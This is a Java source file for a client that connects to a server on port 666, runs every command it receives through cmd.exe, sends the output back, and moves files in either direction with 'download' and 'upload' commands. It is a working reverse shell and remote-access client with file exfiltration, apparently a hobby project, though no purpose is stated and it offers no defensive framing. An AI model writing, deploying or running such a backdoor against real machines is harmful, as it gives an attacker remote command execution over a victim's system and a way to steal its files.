import java.io.*;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import java.io.*;
import java.net.Socket;
import java.util.*;

public class Client {
    public static void main(String args[]) {
        try {
            Socket s = new Socket("localhost", 666);
            Process p = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
            //input and output
            BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
            PrintWriter pr = new PrintWriter(s.getOutputStream());
            //send path
            String path = getPath();
            pr.println(path);
            pr.flush();
            //program
            while (true) {
                //wait for command
                String cmd = br.readLine();
                String res = "";
                //if the command is cd
                String command = cmd.split(" ")[0];
                //upload file to server
                if (command.equals("download")) {
                    try {
                        String filename = getFileNameFromCommand(cmd);
                        FileInputStream fs = new FileInputStream(path + filename);
                        int size = (int) fs.getChannel().size();
                        pr.println(size);
                        pr.flush();
                        byte[] b = new byte[size];
                        fs.read(b, 0, b.length);
                        OutputStream os = s.getOutputStream();
                        os.write(b, 0, b.length);
                        //wait for finish
                        br.readLine();
                    } catch (FileNotFoundException e) {
                        pr.println("Error! File not found!");
                        pr.flush();
                    }
                } else if (command.equals("upload")) {
                    int size = Integer.parseInt(br.readLine().replace("\n", ""));
                    byte[] b = new byte[size];
                    InputStream is = s.getInputStream();
                    String filename = getFileNameFromCommand(cmd);
                    FileOutputStream fo = new FileOutputStream(normalizePath(path) + "\\" + filename);
                    int count;
                    byte[] buffer = new byte[size]; // or 4096, or more
                    while (fo.getChannel().size() < size-1 && (count = is.read(buffer)) > 0)
                        fo.write(buffer, 0, count);
                    pr.println("finish"); pr.flush();
                } else {
                    //change dir
                    if (command.equals("cd")) {
                        //change path backwards
                        if (cmd.contains("..")) {
                            cmd = cmd.replace("..", "x");
                            int count = (int) cmd.chars().filter(ch -> ch == 'x').count();
                            ArrayList<String> dirs = new ArrayList<>();
                            dirs.addAll(Arrays.asList(path.split("\\\\")));
                            for (int i = 0; i < count; i++)
                                dirs.remove(dirs.size() - 1);
                            path = String.join("\\", dirs);
                        }
                        //change disk
                        else if(cmd.contains(":"))
                            path = cmd.replace("cd ", "") + "\\";
                            //base path
                        else if(cmd.length() < 5 && cmd.contains("/") || cmd.contains("\\"))
                            path = path.split("\\\\")[0] ;
                            //change path forward
                        else {
                            if (cmd.length() > 3) {
                                if (path.charAt(path.length() - 1) != '\\') path += "\\";
                                path += cmd.replace("cd ", "");
                                if (path.charAt(path.length() - 1) != '\\') path += "\\";
                            }
                        }
                    }
                    res = runCommand(cmd, path).replace("\n", "</br>");
                    if (res.contains("Impossibile trovare il percorso specificato")) {
                        ArrayList<String> dirs = new ArrayList<>();
                        dirs.addAll(Arrays.asList(path.split("\\\\")));
                        dirs.remove(dirs.size() - 1);
                        path = String.join("\\", dirs);
                    }
                    pr.println(res);
                    pr.flush();
                }
                //send path
                path = normalizePath(path);
                pr.println(path);
                pr.flush();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    static String getPath() {
        return System.getProperty("user.dir");
    }

    static String runCommand(String cmd, String path) {
        String res = "";
        ProcessBuilder processBuilder = new ProcessBuilder();
        // Windows
        processBuilder.command("cmd.exe", "/c", cmd);
        processBuilder.directory(new File(path));
        try {
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) res += line + '\n';
            int exitCode = process.waitFor();
        } catch (InterruptedException | IOException e) {
            res = "\"" + cmd + "\" non è riconosciuto come comando interno o esterno, un programma eseguibile o un file batch.";
            if (cmd.split(" ")[0].equals("cd")) res = "Impossibile trovare il percorso specificato.";
        }
        return res;
    }

    static String normalizePath(String path) {
        if (path.contains("/"))  path = path.replace("/", "\\");
        if (path.charAt(path.length() - 1) != '\\') path += "\\";
        return path;
    }

    static String getFileNameFromCommand(String cmd) {
        ArrayList<String> tmp = new ArrayList<>();
        tmp.addAll(Arrays.asList(cmd.split(" ")));
        tmp.remove(0);
        return String.join(" ", tmp);
    }
}